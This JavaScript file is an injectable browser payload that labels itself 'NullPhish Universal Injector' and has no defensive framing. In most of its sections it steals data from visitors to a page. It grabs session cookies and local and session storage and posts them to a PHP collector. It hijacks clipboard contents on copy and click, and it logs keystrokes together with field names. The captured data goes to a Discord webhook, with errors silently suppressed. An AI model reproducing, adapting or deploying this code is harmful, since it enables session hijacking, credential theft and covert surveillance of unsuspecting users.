
(function() {
    'use strict';
    
    // ===== CONFIG - Toggle features on/off =====
    const CONFIG = {
        sessionGrabber: true,    // Grab document.cookie
        clipboardHijack: true,   // Intercept copy/paste
        keylogger: true,         // Log keystrokes
        localStorageGrab: true,  // Grab localStorage/sessionStorage
        webhookURL: ''           // Leave empty, set via menu option 101
    };

    const MAX_FIELD_LENGTH = 1000;

    function truncate(value, length = MAX_FIELD_LENGTH) {
        const text = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
        return text.length > length ? text.slice(0, length) + '…' : text;
    }
    
    // ===== SESSION COOKIE GRABBER =====
    if (CONFIG.sessionGrabber) {
        let cookies = '';
        let storage = {};
        try {
            cookies = document.cookie;
            storage = {
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };
        } catch (error) {
            storage = { error: 'storage access denied' };
        }
        
        const payload = {
            type: 'session_data',
            url: window.location.href,
            cookies: cookies,
            storage: storage,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };
        
        // Send to the existing PHP collector
        fetch('/ip.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {}); // Silent fail
        
        // If webhook configured, send there too
        if (CONFIG.webhookURL) {
            sendToWebhook(payload);
        }
    }
    
    // ===== CLIPBOARD HIJACKER =====
    if (CONFIG.clipboardHijack) {
        let clipboardBuffer = '';
        
        document.addEventListener('copy', function(e) {
            clipboardBuffer = (e.clipboardData && e.clipboardData.getData('text/plain')) || window.getSelection().toString();
            const clipboardPayload = {
                type: 'clipboard',
                data: clipboardBuffer,
                timestamp: new Date().toISOString()
            };
            
            if (CONFIG.webhookURL) {
                sendToWebhook(clipboardPayload);
            }
        });
        
        // Also try to read clipboard directly (requires user gesture or permission)
        document.addEventListener('click', function() {
            if (navigator.clipboard && navigator.clipboard.readText) {
                navigator.clipboard.readText().then(function(text) {
                    if (text && text !== clipboardBuffer) {
                        clipboardBuffer = text;
                        const clipboardPayload = {
                            type: 'clipboard',
                            data: text,
                            timestamp: new Date().toISOString()
                        };
                        if (CONFIG.webhookURL) {
                            sendToWebhook(clipboardPayload);
                        }
                    }
                }).catch(() => {}); // Permission denied = silent
            }
        }, { once: true });
    }
    
    // ===== KEYLOGGER =====
    if (CONFIG.keylogger) {
        let keystrokeBuffer = '';
        let keystrokeTimer = null;
        
        document.addEventListener('keypress', function(e) {
            keystrokeBuffer += e.key;
            
            // Flush buffer every 2 seconds of inactivity
            clearTimeout(keystrokeTimer);
            keystrokeTimer = setTimeout(function() {
                if (keystrokeBuffer.length > 0) {
                    const keylogPayload = {
                        type: 'keystrokes',
                        data: keystrokeBuffer,
                        field: e.target.name || e.target.id || 'unknown',
                        timestamp: new Date().toISOString()
                    };
                    
                    if (CONFIG.webhookURL) {
                        sendToWebhook(keylogPayload);
                    }
                    keystrokeBuffer = '';
                }
            }, 2000);
        });
        
        // Also capture input field focus for context
        document.addEventListener('focusin', function(e) {
            if (e.target.tagName === 'INPUT') {
                keystrokeBuffer = ''; // Reset buffer for new field
            }
        });
    }
    
    // ===== LOCAL STORAGE GRABBER (runs on load) =====
    if (CONFIG.localStorageGrab) {
        // Already grabbed in sessionGrabber section above
        // This is for standalone use when sessionGrabber is off
        if (!CONFIG.sessionGrabber) {
            const storagePayload = {
                type: 'storage_data',
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            if (CONFIG.webhookURL) {
                sendToWebhook(storagePayload);
            }
        }
    }
    
    // ===== DISCORD WEBHOOK SENDER =====
    function sendToWebhook(data) {
        if (!CONFIG.webhookURL) return;
        
        const rawData = data.data || data.cookies || data;
        const embed = {
            embeds: [{
                title: 'New Captured Data: ' + data.type,
                color: 0xff0000,
                fields: [
                    { name: 'Type', value: data.type, inline: true },
                    { name: 'URL', value: data.url || window.location.href, inline: true },
                    { name: 'Timestamp', value: data.timestamp, inline: true },
                    { name: 'Data', value: '```' + truncate(rawData) + '```', inline: false },
                    { name: 'User Agent', value: data.userAgent || navigator.userAgent, inline: false }
                ],
                footer: { text: 'NullPhish Universal Injector' }
            }]
        };
        
        fetch(CONFIG.webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(embed)
        }).catch(() => {}); // Silent fail - no error logs
    }
    
})();